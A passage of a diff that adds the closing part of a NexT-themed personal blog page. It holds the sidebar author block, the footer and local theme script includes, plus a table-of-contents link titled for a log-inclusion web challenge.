href="#web170-%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="nav-number">17.</span> <span class="nav-text">web170(日志包含)</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="程勇胜"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">程勇胜</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">29</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">程勇胜</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
